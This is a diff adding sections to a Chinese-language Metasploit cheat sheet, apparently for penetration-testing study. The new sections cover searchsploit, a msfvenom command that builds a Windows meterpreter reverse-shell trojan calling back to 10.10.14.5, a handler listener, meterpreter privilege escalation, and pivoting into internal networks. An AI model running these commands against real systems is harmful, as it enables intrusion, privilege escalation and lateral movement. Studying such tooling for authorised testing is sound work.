@@ -147,6 +147,22 @@ msf6 auxiliary(scanner/ssh/ssh_login) >
 
 ---
 
+## searchsploit — Exploit-DB 本地搜索（独立工具）
+
+> `searchsploit` 是 Kali 中 `exploitdb` 包自带的独立命令行工具，**不是 Metasploit 的一部分**，也不在 msfconsole 里。它搜索本地克隆的 Exploit-DB 漏洞库（`/usr/share/exploitdb/`），用于在发起攻击前查找现成的 exploit 脚本。
+
+与 `search edb:` 的区别：msfconsole 的 `search` 只搜索 Metasploit **自己的模块库**，`edb:` 字段匹配的是模块元数据里引用的 EDB 编号；`searchsploit` 覆盖整个 Exploit-DB 数据库，包含大量**非 Metasploit** 的 PoC / 脚本（C、Python、Ruby 等），两者互补。
+
+```bash
+searchsploit eternalblue             # 关键词搜索
+searchsploit windows remote smb      # 多关键词 AND 搜索
+searchsploit -p 42315                # 显示该漏洞的本地文件路径
+searchsploit -m 42315                # 镜像复制到当前目录
+searchsploit --update                # 用 git 同步更新本地库
+```
+
+---
+
 ## use 与 info — 载入与查看模块
 
 ```
@@ -197,7 +213,32 @@ check        # 部分 exploit 支持：先检测目标是否可利用，不实�
 
 ---
 
-## sessions — 会话管理
+## msfvenom — 生成载荷/木马（独立二进制）
+
+> `msfvenom` 是 Metasploit 套件的**独立程序**（不是 msfconsole 内命令），用于生成独立的 payload 文件（reverse shell 木马等）。因为不参与 `search → use → set → run` 的交互流程，所以在控制台外执行。
+
+```bash
+# 生成 Windows x64 的 meterpreter 反弹木马
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
+
+msfvenom --list payloads      # 列出全部可用 payload
+```
+
+生成后需在 msfconsole 里用 `handler` 监听，payload 参数必须与生成时完全一致：
+
+```
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set lhost 10.10.14.5
+set lport 4444
+run -j                        # 后台运行监听
+```
+
+**staged 与 stageless：** staged 载荷（路径为 `.../meterpreter/reverse_tcp`）先回传一小段 stager，再由 stager 二次回连下载完整 payload，文件体积小；stageless（下划线写法 `.../meterpreter_reverse_tcp`）把完整 payload 直接打进文件，体积大但无需第二次回连。按目标环境（杀软、文件大小限制）选择。
+
+---
+
+## sessions — 会话管理与会话派生
 
 利用成功后建立会话，之后的操作都在会话内完成：
 
@@ -205,8 +246,41 @@ check        # 部分 exploit 支持：先检测目标是否可利用，不实�
 sessions -l          # 列出所有会话
 sessions -i 1        # 进入会话 1
 sessions -k 1        # 杀掉会话 1
-# 会话内按 Ctrl+Z 可退回 msfconsole 并保留会话（background）
 ```
+
+### 会话内常用操作（meterpreter）
+
+进入会话后，`meterpreter >` 提示符下：
+
+```
+background      # 退回 msfconsole 并保留会话（等价 Ctrl+Z）
+shell           # 进入目标系统命令 shell
+getsystem       # 尝试提权到 SYSTEM
+run post/multi/recon/local_exploit_suggester   # 收集本地提权线索
+exit            # 结束会话
+```
+
+### 后台任务与监听（派生新会话）
+
+在 msfconsole 顶层：
+
+```
+exploit -j                  # 把 exploit 作为后台任务运行，不占用控制台
+jobs -l                     # 查看后台任务
+use exploit/multi/handler   # 建立监听，接收后续反弹的 shell
+```
+
+### 横向路由（借已有会话访问内网）
+
+拿到会话后可用 `route` 把它变成跳板，访问目标内网其他网段：
+
+```
+route add 172.16.5.0 255.255.255.0 1   # 通过会话 1 访问 172.16.5.0/24
+route print                             # 查看路由表
+run post/multi/manage/autoroute         # 自动添加路由
+```
+
+之后 msfconsole 里的扫描/利用模块就会经由该会话转发，无需直连内网。会话相关命令的完整选项因版本略有差异，使用前先 `sessions -h` 查看。
 
 ---
 
